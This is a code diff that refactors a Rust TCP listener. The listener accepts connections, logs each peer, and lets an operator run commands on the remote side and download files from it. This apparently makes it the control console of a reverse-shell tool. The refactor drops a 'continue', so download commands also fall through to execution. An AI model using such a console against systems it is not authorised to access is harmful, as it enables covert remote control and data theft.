@@ -1,3 +1,5 @@
+use std::process::exit;
+
 use colored::Colorize;
 
 mod handler;
@@ -21,37 +23,41 @@ fn main() {
             }
         };
         std::thread::spawn(move || {
+            println!("[*] New connection from {}", stream.peer_addr().unwrap());
             let mut handler = Handler::new(&mut stream);
-            loop {
-                let cmd = prompt!(handler);
-                match cmd.as_str() {
-                    ".quit" => {
-                        handler.quit().expect("Error quitting");
-                        break;
-                    }
-                    _ => {
-                        if cmd.starts_with("download") {
-                            let full_cmd = cmd.clone();
-                            let filename = full_cmd.split_whitespace().last().unwrap();
-                            let cmd = cmd.replace(filename, "");
-                            match handler.download(cmd, filename.to_string()) {
-                                Ok(_) => (),
-                                Err(e) => {
-                                    println!("Error downloading file: {}", e);
-                                }
-                            }
-                            continue;
-                        }
-                        match handler.exec(cmd) {
-                            Ok(_) => (),
-                            Err(e) => {
-                                println!("Error executing command: {}", e);
-                            }
-                        }
-                    }
-                }
-            }
-            println!("[!!] Connection closed");
+            manager(&mut handler);
         });
     }
+}
+
+fn manager(handler: &mut Handler) {
+    loop {
+        let cmd = prompt!(handler);
+
+        if cmd.starts_with("download") {
+            let full_cmd = cmd.clone();
+            println!("full_cmd: {}", full_cmd);
+            let filename = full_cmd.split_whitespace().last().unwrap();
+            let cmd = cmd.replace(filename, "");
+            match handler.download(cmd, filename.to_string()) {
+                Ok(_) => (),
+                Err(e) => {
+                    println!("Error downloading file: {}", e);
+                }
+            }
+        }
+
+        if cmd.starts_with(".quit") {
+            handler.quit().expect("Error quitting");
+            break;
+        }
+
+        match handler.exec(cmd) {
+            Ok(_) => (),
+            Err(e) => {
+                println!("Error executing command: {}", e);
+            }
+        }
+    }
+    println!("[!!] Connection closed");
 }
